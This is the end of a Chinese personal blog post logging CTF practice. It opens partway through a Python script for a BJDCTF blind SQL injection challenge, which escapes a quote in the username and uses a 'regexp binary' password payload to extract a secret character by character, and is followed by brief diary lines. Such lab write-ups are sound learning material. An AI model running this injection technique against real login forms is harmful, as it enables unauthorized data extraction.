class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'_'</span>,<span class="string">'/'</span>,<span class="string">'-'</span>,<span class="string">'&amp;'</span>,<span class="string">"%"</span>,<span class="string">'#'</span>,<span class="string">'@'</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'g'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'G'</span>,<span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'Z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">flag=<span class="string">'^'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> alphabet:</span><br><span class="line"></span><br><span class="line">        tmp=flag+y</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line"></span><br><span class="line">            <span class="string">"username"</span>: <span class="string">"P3rh4ps\\"</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">"password"</span>: <span class="string">"||password regexp binary &#123;&#125;#"</span>.format(str2hex(tmp))</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">#     print(data['password'])</span></span><br><span class="line"></span><br><span class="line">        x=requests.session()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'BJD needs'</span> <span class="keyword">in</span> x.post(url,data=data).text:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#    print(x.post(url,data=data).text)</span></span><br><span class="line"></span><br><span class="line">            flag=tmp</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    print(flag.replace(<span class="string">"^"</span>,<span class="string">""</span>))</span><br></pre></td></tr></table></figure>
<h1 id="2020-3-28"><a href="#2020-3-28" class="headerlink" title="2020/3/28"></a>2020/3/28</h1><p>没写完</p>
<h1 id="2020-7-2-1"><a href="#2020-7-2-1" class="headerlink" title="2020/7/2"></a>2020/7/2</h1><p>先写这些吧 我还会再回来的</p>

      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/笔记/" rel="tag"># 笔记</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/06/17/物联网考试/" rel="next" title="物联网考试">
                <i class="fa fa-chevron-left"></i> 物联网考试
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/02/18/路由器利用zerotier插件实现异地组网、内网穿透、远程管理路由器-NAS等网络设备/" rel="prev" title="路由器利用zerotier插件实现异地组网、内网穿透、远程管理路由器/NAS等网络设备">
                路由器利用zerotier插件实现异地组网、内网穿透、远程管理路由器/NAS等网络设备 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  
    <div class="comments" id="comments">
      <div id="lv-container" data-id="city" data-uid="MTAyMC80NzA3MC8yMzU3MA=="></div>
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt>
            
              <p class="site-author-name" itemprop="name"></p>
              <div class="site-description motion-element" itemprop="description">夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。</div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">39</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  
                    
                      <a href="/categories/">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">6</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  
                    
                      <a href="/tags/">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">33</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          

          

          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友链
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.ak6666.top/" title="http://blog.ak6666.top/" rel="noopener" target="_blank">阿凯</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          

        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=536976917&auto=1&height=32"></iframe>


          

        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-4"><span class="nav-number">1.</span> <span class="nav-text">2020/2/4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HCTF-2018-WarmUp"><span class="nav-number">1.1.</span> <span class="nav-text">[HCTF 2018]WarmUp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#强网杯-2019-随便注"><span class="nav-number">1.2.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-5"><span class="nav-number">2.</span> <span class="nav-text">2020/2/5</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#护网杯-2018-easy-tornado"><span class="nav-number">2.1.</span> <span class="nav-text">[护网杯 2018]easy_tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-EasySQL"><span class="nav-number">2.2.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-2-6"><span class="nav-number">2.3.</span> <span class="nav-text">2020/2/6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-number">2.4.</span> <span class="nav-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-CheckIn"><span class="nav-number">2.5.</span> <span class="nav-text">[SUCTF 2019]CheckIn</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-7"><span class="nav-number">3.</span> <span class="nav-text">2020/2/7</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-Havefun"><span class="nav-number">3.1.</span> <span class="nav-text">[极客大挑战 2019]Havefun</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-Secret-File"><span class="nav-number">3.2.</span> <span class="nav-text">[极客大挑战 2019]Secret File</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-8"><span class="nav-number">4.</span> <span class="nav-text">2020/2/8</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-禁止套娃"><span class="nav-number">4.1.</span> <span class="nav-text">[GXYCTF2019]禁止套娃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-BabySQli"><span class="nav-number">4.2.</span> <span class="nav-text">[GXYCTF2019]BabySQli</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-9"><span class="nav-number">5.</span> <span class="nav-text">2020/2/9</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-number">5.1.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-Http"><span class="nav-number">5.2.</span> <span class="nav-text">[极客大挑战 2019]Http</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-10"><span class="nav-number">6.</span> <span class="nav-text">2020/2/10</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-LoveSQL"><span class="nav-number">6.1.</span> <span class="nav-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-Upload"><span class="nav-number">6.2.</span> <span class="nav-text">[极客大挑战 2019]Upload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-11"><span class="nav-number">7.</span> <span class="nav-text">2020/2/11</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-Knife"><span class="nav-number">7.1.</span> <span class="nav-text">[极客大挑战 2019]Knife</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-EasySQL"><span class="nav-number">7.2.</span> <span class="nav-text">[极客大挑战 2019]EasySQL</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-12"><span class="nav-number">8.</span> <span class="nav-text">2020/2/12</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#安洵杯-2019-easy-web"><span class="nav-number">8.1.</span> <span class="nav-text">[安洵杯 2019]easy_web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-新生赛-Include"><span class="nav-number">8.2.</span> <span class="nav-text">[ACTF2020 新生赛]Include</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-13"><span class="nav-number">9.</span> <span class="nav-text">2020/2/13</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-新生赛-Upload"><span class="nav-number">9.1.</span> <span class="nav-text">[ACTF2020 新生赛]Upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-新生赛-Exec"><span class="nav-number">9.2.</span> <span class="nav-text">[ACTF2020 新生赛]Exec</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-14"><span class="nav-number">10.</span> <span class="nav-text">2020/2/14</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#研究ce"><span class="nav-number">10.1.</span> <span class="nav-text">研究ce</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-15"><span class="nav-number">11.</span> <span class="nav-text">2020/2/15</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#制作了mirror修改器"><span class="nav-number">11.1.</span> <span class="nav-text">制作了mirror修改器</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-15-1"><span class="nav-number">12.</span> <span class="nav-text">2020/2/15</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#学习ce由浅入深"><span class="nav-number">12.1.</span> <span class="nav-text">学习ce由浅入深</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-17"><span class="nav-number">13.</span> <span class="nav-text">2020/2/17</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUCTF-2018-Online"><span class="nav-number">13.1.</span> <span class="nav-text">[BUUCTF 2018]Online</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-新生赛-BackupFile"><span class="nav-number">13.2.</span> <span class="nav-text">[ACTF2020 新生赛]BackupFile</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-18"><span class="nav-number">14.</span> <span class="nav-text">2020/2/18</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#没记得做了什么事情"><span class="nav-number">14.1.</span> <span class="nav-text">没记得做了什么事情</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-19"><span class="nav-number">15.</span> <span class="nav-text">2020/2/19</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#购买了-Wallpaper-Engine-搞起了动态桌面。"><span class="nav-number">15.1.</span> <span class="nav-text">购买了 Wallpaper Engine ,搞起了动态桌面。</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-20"><span class="nav-number">16.</span> <span class="nav-text">2020/2/20</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#王者荣耀上到了星耀段位"><span class="nav-number">16.1.</span> <span class="nav-text">王者荣耀上到了星耀段位</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-21"><span class="nav-number">17.</span> <span class="nav-text">2020/2/21</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0CTF-2016-piapiapia"><span class="nav-number">17.1.</span> <span class="nav-text">[0CTF 2016]piapiapia</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2020年新春战疫网络安全公益赛"><span class="nav-number">17.2.</span> <span class="nav-text">2020年新春战疫网络安全公益赛</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-22"><span class="nav-number">18.</span> <span class="nav-text">2020/2/22</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF2020-Mark-loves"><span class="nav-number">18.1.</span> <span class="nav-text">[BJDCTF2020]Mark loves</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF2020-The-mystery-of-ip"><span class="nav-number">18.2.</span> <span class="nav-text">[BJDCTF2020]The mystery of ip</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-23"><span class="nav-number">19.</span> <span class="nav-text">2020/2/23</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF2020-ZJCTF，不过如此"><span class="nav-number">19.1.</span> <span class="nav-text">[BJDCTF2020]ZJCTF，不过如此</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-BabySQL"><span class="nav-number">19.2.</span> <span class="nav-text">[极客大挑战 2019]BabySQL</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-2-24"><span class="nav-number">20.</span> <span class="nav-text">2020/2/24</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#研究cobaltstrike"><span class="nav-number">20.1.</span> <span class="nav-text">研究cobaltstrike</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-7-2"><span class="nav-number">20.2.</span> <span class="nav-text">2020/7/2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-3-7"><span class="nav-number">21.</span> <span class="nav-text">2020/3/7</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-php-unserialize"><span class="nav-number">21.1.</span> <span class="nav-text">Web_php_unserialize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-php-include"><span class="nav-number">21.2.</span> <span class="nav-text">Web_php_include</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-3-24"><span class="nav-number">22.</span> <span class="nav-text">2020/3/24</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-fake-google"><span class="nav-number">22.1.</span> <span class="nav-text">[BJDCTF 2nd]fake google</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-old-hack"><span class="nav-number">22.2.</span> <span class="nav-text">[BJDCTF 2nd]old-hack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-duangShell"><span class="nav-number">22.3.</span> <span class="nav-text">[BJDCTF 2nd]duangShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-简单注入"><span class="nav-number">22.4.</span> <span class="nav-text">[BJDCTF 2nd]简单注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-3-28"><span class="nav-number">23.</span> <span class="nav-text">2020/3/28</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-7-2-1"><span class="nav-number">24.</span> <span class="nav-text">2020/7/2</span></a></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>
  </aside>
  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>

  

  
</div>


  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div> 
   


  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.1</div>




<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

<span id="busuanzi_container_site_pv">
    <br>本站总访问量<span id="busuanzi_value_site_pv"></span>次
</span>
        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/utils.js?v=7.1.1"></script>

  <script src="/js/motion.js?v=7.1.1"></script>



  
  


  <script src="/js/affix.js?v=7.1.1"></script>

  <script src="/js/schemes/pisces.js?v=7.1.1"></script>




  
  <script src="/js/scrollspy.js?v=7.1.1"></script>
<script src="/js/post-details.js?v=7.1.1"></script>



  


  <script src="/js/next-boot.js?v=7.1.1"></script>


  

  

  

  


  
    <script>
  window.livereOptions = {
    refer: '2020/07/02/一段时间的学习记录/'
  };
  (function(d, s) {
    var j, e = d.getElementsByTagName(s)[0];
    if (typeof LivereTower === 'function') { return; }
    j = d.createElement(s);
    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
    j.async = true;
    e.parentNode.insertBefore(j, e);
  })(document, 'script');
</script>

  


  




  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

</body>
</html>
